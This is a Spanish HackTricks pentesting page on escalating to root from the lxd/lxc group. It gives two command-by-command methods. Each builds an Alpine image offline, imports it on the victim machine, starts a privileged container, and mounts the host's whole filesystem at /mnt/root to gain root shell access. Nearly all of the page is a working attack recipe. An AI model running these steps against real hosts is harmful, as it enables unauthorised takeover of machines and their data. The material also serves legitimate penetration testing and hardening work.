# lxd/lxc Grupo - Escalación de privilegios

{{#include ../../../banners/hacktricks-training.md}}

Si perteneces al grupo _**lxd**_ **o** _**lxc**_, puedes convertirte en root

## Explotando sin internet

### Método 1

Puedes instalar en tu máquina este constructor de distribuciones: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(sigue las instrucciones del github):
```bash
sudo su
# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
## Using build-lxd
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
## Using build-lxc
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```
Sube los archivos **lxd.tar.xz** y **rootfs.squashfs**, añade la imagen al repositorio y crea un contenedor:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Si encuentras este error _**Error: No se encontró ningún grupo de almacenamiento. Por favor, crea un nuevo grupo de almacenamiento**_\
> Ejecuta **`lxd init`** y **repite** el bloque anterior de comandos

Finalmente puedes ejecutar el contenedor y obtener root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Método 2

Construya una imagen de Alpine y iníciela usando la bandera `security.privileged=true`, forzando al contenedor a interactuar como root con el sistema de archivos del host.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
